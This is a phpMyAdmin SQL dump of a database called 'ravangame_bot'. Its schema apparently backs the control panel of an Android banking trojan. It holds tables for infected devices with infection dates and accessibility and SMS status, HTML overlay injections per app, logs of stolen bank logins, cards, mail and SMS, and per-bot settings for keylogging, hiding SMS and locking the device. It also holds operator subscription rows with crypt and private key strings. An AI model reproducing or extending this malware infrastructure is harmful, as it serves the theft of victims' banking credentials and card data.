-- phpMyAdmin SQL Dump
-- version 4.9.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Aug 31, 2020 at 01:52 AM
-- Server version: 5.7.21-20-beget-5.7.21-20-1-log
-- PHP Version: 5.6.40

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `ravangame_bot`
--

-- --------------------------------------------------------

--
-- Table structure for table `bots`
--
-- Creation: Aug 30, 2020 at 08:18 PM
-- Last update: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `bots`;
CREATE TABLE `bots` (
  `id_key` int(255) UNSIGNED NOT NULL,
  `idbot` varchar(50) NOT NULL,
  `ip` varchar(30) DEFAULT NULL,
  `operator` varchar(100) DEFAULT NULL,
  `phoneNumber` varchar(50) DEFAULT NULL,
  `model` varchar(100) DEFAULT NULL,
  `android` varchar(15) NOT NULL,
  `TAG` varchar(50) DEFAULT NULL,
  `country` varchar(15) DEFAULT NULL,
  `lastconnect` varchar(20) DEFAULT NULL,
  `date_infection` varchar(20) DEFAULT NULL,
  `commands` varchar(4000) DEFAULT NULL,
  `banks` varchar(1500) DEFAULT NULL,
  `comment` varchar(3500) DEFAULT NULL,
  `statProtect` varchar(3) DEFAULT NULL,
  `statScreen` varchar(3) DEFAULT NULL,
  `statAccessibility` varchar(3) DEFAULT NULL,
  `statSMS` varchar(3) DEFAULT NULL,
  `statCards` varchar(3) DEFAULT NULL,
  `statBanks` varchar(3) DEFAULT NULL,
  `statMails` varchar(3) DEFAULT NULL,
  `activeDevice` varchar(254) DEFAULT NULL,
  `timeWorking` varchar(254) DEFAULT NULL,
  `statDownloadModule` varchar(3) DEFAULT NULL,
  `statAdmin` varchar(3) DEFAULT NULL,
  `updateSettings` varchar(3) DEFAULT NULL,
  `locale` varchar(10) DEFAULT NULL,
  `batteryLevel` varchar(10) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `dataInjections`
--
-- Creation: Aug 30, 2020 at 08:18 PM
-- Last update: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `dataInjections`;
CREATE TABLE `dataInjections` (
  `id` int(254) NOT NULL,
  `app` varchar(50) NOT NULL,
  `html` longtext NOT NULL,
  `icon` longtext
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `logsBank`
--
-- Creation: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `logsBank`;
CREATE TABLE `logsBank` (
  `id` int(254) NOT NULL,
  `idinj` varchar(50) NOT NULL,
  `idbot` varchar(50) NOT NULL,
  `application` varchar(100) NOT NULL,
  `logs` varchar(3000) NOT NULL,
  `comment` varchar(2000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `logsBotsSMS`
--
-- Creation: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `logsBotsSMS`;
CREATE TABLE `logsBotsSMS` (
  `id` int(254) UNSIGNED NOT NULL,
  `idbot` varchar(50) NOT NULL,
  `logs` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `logsCC`
--
-- Creation: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `logsCC`;
CREATE TABLE `logsCC` (
  `id` int(254) NOT NULL,
  `idinj` varchar(50) NOT NULL,
  `idbot` varchar(50) NOT NULL,
  `application` varchar(100) NOT NULL,
  `logs` varchar(3000) NOT NULL,
  `comment` varchar(2000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `logsListApplications`
--
-- Creation: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `logsListApplications`;
CREATE TABLE `logsListApplications` (
  `id` int(254) UNSIGNED NOT NULL,
  `idbot` varchar(50) DEFAULT NULL,
  `logs` longtext
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `logsMail`
--
-- Creation: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `logsMail`;
CREATE TABLE `logsMail` (
  `id` int(254) NOT NULL,
  `idinj` varchar(50) NOT NULL,
  `idbot` varchar(50) NOT NULL,
  `application` varchar(100) NOT NULL,
  `logs` varchar(3000) NOT NULL,
  `comment` varchar(2000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `logsPhoneNumber`
--
-- Creation: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `logsPhoneNumber`;
CREATE TABLE `logsPhoneNumber` (
  `id` int(254) UNSIGNED NOT NULL,
  `idbot` varchar(50) NOT NULL,
  `logs` longtext NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `settingBots`
--
-- Creation: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `settingBots`;
CREATE TABLE `settingBots` (
  `id` int(254) UNSIGNED NOT NULL,
  `idbot` varchar(30) NOT NULL,
  `hideSMS` varchar(3) DEFAULT NULL,
  `lockDevice` varchar(3) DEFAULT NULL,
  `offSound` varchar(3) DEFAULT NULL,
  `keylogger` varchar(3) DEFAULT NULL,
  `activeInjection` varchar(3000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--
-- Creation: Aug 30, 2020 at 08:18 PM
-- Last update: Aug 30, 2020 at 08:18 PM
--

DROP TABLE IF EXISTS `settings`;
CREATE TABLE `settings` (
  `saveID` varchar(30) DEFAULT NULL,
  `arrayUrl` varchar(1500) DEFAULT NULL,
  `timeInject` varchar(25) DEFAULT NULL,
  `timeCC` varchar(25) DEFAULT NULL,
  `timeMail` varchar(25) DEFAULT NULL,
  `timeProtect` varchar(25) DEFAULT NULL,
  `updateTableBots` varchar(5) DEFAULT NULL,
  `pushTitle` varchar(70) DEFAULT NULL,
  `pushText` varchar(400) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `user2`
--
-- Creation: Aug 30, 2020 at 08:30 PM
--

DROP TABLE IF EXISTS `user2`;
CREATE TABLE `user2` (
  `ID` int(255) UNSIGNED NOT NULL,
  `contact` varchar(255) NOT NULL,
  `serverinfo` varchar(255) DEFAULT NULL,
  `domain` varchar(1500) DEFAULT NULL,
  `apicryptkey` varchar(100) DEFAULT NULL,
  `other` varchar(255) DEFAULT NULL,
  `end_subscribe` date NOT NULL,
  `privatekey` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--
-- Creation: Aug 30, 2020 at 08:30 PM
-- Last update: Aug 30, 2020 at 09:50 PM
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE `users` (
  `ID` int(255) UNSIGNED NOT NULL,
  `contact` varchar(255) NOT NULL,
  `serverinfo` varchar(255) DEFAULT NULL,
  `domain` varchar(1500) DEFAULT NULL,
  `apicryptkey` varchar(100) DEFAULT NULL,
  `other` varchar(255) DEFAULT NULL,
  `end_subscribe` date NOT NULL,
  `privatekey` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`ID`, `contact`, `serverinfo`, `domain`, `apicryptkey`, `other`, `end_subscribe`, `privatekey`) VALUES
(1, '12412', '412412', '4124', '07R2d9CidWmw4', '12412412', '2100-10-10', 'UERZ6GmktB0ipJ8YEb3ghZE4dXhHHKAQd54pgqSL98A9XNxxY0NEZfpcV6hlIhftbv9L0tOJdLlMnR3bRgT3JRDpfKjdiO17cQ5g'),
(2, 'Shjsjs', 'Hhshsjs', 'Hssjdjjd', 'Dhdhjdjd', 'Hshsjdjd', '2500-10-10', '31lisans');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `bots`
--
ALTER TABLE `bots`
  ADD PRIMARY KEY (`id_key`);

--
-- Indexes for table `dataInjections`
--
ALTER TABLE `dataInjections`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logsBank`
--
ALTER TABLE `logsBank`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logsBotsSMS`
--
ALTER TABLE `logsBotsSMS`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logsCC`
--
ALTER TABLE `logsCC`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logsListApplications`
--
ALTER TABLE `logsListApplications`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logsMail`
--
ALTER TABLE `logsMail`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `logsPhoneNumber`
--
ALTER TABLE `logsPhoneNumber`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `settingBots`
--
ALTER TABLE `settingBots`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user2`
--
ALTER TABLE `user2`
  ADD PRIMARY KEY (`ID`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`ID`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `bots`
--
ALTER TABLE `bots`
  MODIFY `id_key` int(255) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `dataInjections`
--
ALTER TABLE `dataInjections`
  MODIFY `id` int(254) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `logsBank`
--
ALTER TABLE `logsBank`
  MODIFY `id` int(254) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `logsBotsSMS`
--
ALTER TABLE `logsBotsSMS`
  MODIFY `id` int(254) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `logsCC`
--
ALTER TABLE `logsCC`
  MODIFY `id` int(254) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `logsListApplications`
--
ALTER TABLE `logsListApplications`
  MODIFY `id` int(254) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `logsMail`
--
ALTER TABLE `logsMail`
  MODIFY `id` int(254) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `logsPhoneNumber`
--
ALTER TABLE `logsPhoneNumber`
  MODIFY `id` int(254) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `settingBots`
--
ALTER TABLE `settingBots`
  MODIFY `id` int(254) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `user2`
--
ALTER TABLE `user2`
  MODIFY `ID` int(255) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `ID` int(255) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
